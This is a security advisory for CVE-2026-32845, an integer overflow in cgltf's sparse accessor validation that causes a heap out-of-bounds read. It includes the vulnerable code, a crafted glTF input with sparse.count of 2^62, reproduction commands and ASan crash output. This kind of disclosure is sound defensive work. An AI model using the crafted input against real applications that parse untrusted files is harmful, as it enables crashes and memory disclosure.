# jkuhlmann / cgltf <= 1.15 Sparse Accessor Validation Integer Overflow

- **CVE ID:** [CVE-2026-32845](https://www.cve.org/CVERecord?id=CVE-2026-32845)
- **Product:** [cgltf](https://github.com/jkuhlmann/cgltf)
- **Reported:** 2026-03-21
- **Published:** 2026-03-23
- **Severity:** Medium
- **CWE:** [CWE-190 Integer Overflow or Wraparound](https://cwe.mitre.org/data/definitions/190.html)
- **Discovered by:** Ana Kapulica of Marlink Cyber

---

## Summary

cgltf version 1.15 and prior contain an integer overflow vulnerability in the `cgltf_validate()` function when validating sparse accessors that allows attackers to trigger out-of-bounds reads by supplying crafted glTF/GLB input files with attacker-controlled size values. Attackers can exploit unchecked arithmetic operations in sparse accessor validation to cause heap buffer over-reads in `cgltf_calc_index_bound()`, resulting in denial of service crashes and potential memory disclosure.

---

## Affected Versions

| Version          | Status     |
| ---------------- | ---------- |
| cgltf <= 1.15    | Vulnerable |

Awaiting fix.

---

## Proof of Concept

### Affected Code

In `cgltf_validate()`:

```c
cgltf_size indices_component_size = cgltf_component_size(sparse->indices_component_type);
cgltf_size indices_req_size = sparse->indices_byte_offset + indices_component_size * sparse->count;
cgltf_size values_req_size = sparse->values_byte_offset + element_size * sparse->count;

CGLTF_ASSERT_IF(sparse->indices_buffer_view->size < indices_req_size ||
                sparse->values_buffer_view->size < values_req_size, cgltf_result_data_too_short);
```

If `indices_component_size * sparse->count` overflows `size_t`, `indices_req_size` becomes too small and the bounds check can be bypassed.

Later in the same function:

```c
cgltf_size index_bound = cgltf_calc_index_bound(
    sparse->indices_buffer_view,
    sparse->indices_byte_offset,
    sparse->indices_component_type,
    sparse->count);
```

`cgltf_calc_index_bound()` then iterates `count` times and reads beyond the sparse index buffer:

```c
for (size_t i = 0; i < count; ++i)
{
    cgltf_size v = ((unsigned int*)data)[i];
    bound = bound > v ? bound : v;
}
```

---

### Root Cause

`cgltf_validate()` computes `indices_req_size` via unchecked multiplication of `indices_component_size * sparse->count` in `cgltf_size` (a `size_t`). A crafted input can set `sparse->count` to a value that causes this multiplication to wrap around to zero under modular arithmetic:

```
4 bytes (UNSIGNED_INT) × 2^62 = 2^64 = 0  (mod 2^64)
```

The bounds check then effectively evaluates:

```
buffer_view->size < 0  →  false
```

Validation passes on a 4-byte buffer. `cgltf_calc_index_bound()` subsequently iterates `2^62` times over that 4-byte buffer, reading far beyond the heap allocation boundary.

> **Note:** `cgltf_validate()` only reaches `cgltf_calc_index_bound()` when `buffer->data` is non-NULL, which is populated by `cgltf_load_buffers()`. Applications that call `cgltf_validate()` without ever loading buffers are not affected. Applications that load buffer data before validating — which is required for any subsequent accessor reads — are affected.

---

### Triggering Input Structure

```json
"accessors": [{
  "bufferView": 0,
  "componentType": 5126,
  "count": 4,
  "type": "SCALAR",
  "sparse": {
    "count": 4611686018427387904,
    "indices": {
      "bufferView": 1,
      "byteOffset": 0,
      "componentType": 5125
    },
    "values": {
      "bufferView": 2,
      "byteOffset": 0
    }
  }
}]
```

The sparse indices buffer is only 4 bytes long. `sparse.count = 2^62`, `componentType = 5125` (UNSIGNED_INT, 4 bytes).

### Reproduce

Clone the repo, then drop `reproduce.c` and `poc.glb` into the repo root alongside `cgltf.h`:

```bash
git clone https://github.com/jkuhlmann/cgltf
cd cgltf
# copy reproduce.c and poc.glb here
clang -g -O1 -I. -DCGLTF_IMPLEMENTATION \
    -fsanitize=address,undefined \
    reproduce.c -o reproduce

ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:halt_on_error=1 \
./reproduce poc.glb

# Without sanitizers                                                                                                                     
  clang -O2 -I. -DCGLTF_IMPLEMENTATION reproduce.c -o reproduce_noasan                                                                                                        
  ./reproduce_noasan poc.glb
```

`reproduce.c` and `poc.glb` are attached.

[poc.zip](./MCSAID-2026-005-cgltf_poc.zip)

### ASan Output

```text
==5560==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf787369e0310 at pc 0xc815f150cf44 bp 0xffffff6aa3e0 sp 0xffffff6aa3d8
READ of size 4 at 0xf787369e0310 thread T0
    #0 0xc815f150cf40 in cgltf_calc_index_bound /home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/./cgltf.h:1579:19
    #1 0xc815f14f5bd4 in cgltf_validate /home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/./cgltf.h:1632:30
    #2 0xc815f152a3b0 in main /home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/reproduce.c:46:5
    #3 0xfa17377f2598 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0xfa17377f2678 in __libc_start_main csu/../csu/libc-start.c:360:3
    #5 0xc815f140946c in _start (/home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/reproduce+0x8946c) (BuildId: 23c6b048bd5b8251f6ca8fc0b438a85db0dc629e)

0xf787369e0310 is located 0 bytes after 656-byte region [0xf787369e0080,0xf787369e0310)
allocated by thread T0 here:
    #0 0xc815f14ad560 in malloc (/home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/reproduce+0x12d560) (BuildId: 23c6b048bd5b8251f6ca8fc0b438a85db0dc629e)
    #1 0xc815f152a2ec in main /home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/reproduce.c:29:20
    #2 0xfa17377f2598 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #3 0xfa17377f2678 in __libc_start_main csu/../csu/libc-start.c:360:3
    #4 0xc815f140946c in _start (/home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/reproduce+0x8946c) (BuildId: 23c6b048bd5b8251f6ca8fc0b438a85db0dc629e)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/ana/fuzzing-lab/targets/cgltf/issues/bug2_sparse_heap_overflow/cgltf/./cgltf.h:1579:19 in cgltf_calc_index_bound
Shadow bytes around the buggy address:
  0xf787369e0080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xf787369e0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xf787369e0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xf787369e0200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xf787369e0280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0xf787369e0300: 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf787369e0380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf787369e0400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf787369e0480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf787369e0500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf787369e0580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==5560==ABORTING
```

The crash also reproduces without sanitizers as a segmentation fault (exit code 139), confirming this is not a sanitizer-only finding.

---

## Impact

A crafted glTF/GLB file with an attacker-controlled `sparse.count` causes `cgltf_validate()` to pass a bounds check via integer overflow and subsequently drives `cgltf_calc_index_bound()` to iterate far beyond the heap allocation, resulting in a heap out-of-bounds read and application crash. Any application that calls `cgltf_load_buffers()` followed by `cgltf_validate()` on untrusted glTF/GLB input is affected.

---

## Mitigations

- Awaiting fix.

---

## References

- GitHub Issue: [Integer Overflow in cgltf_validate() Sparse Accessor Validation Leads to Heap Buffer Overflow on Read](https://github.com/jkuhlmann/cgltf/issues/287)
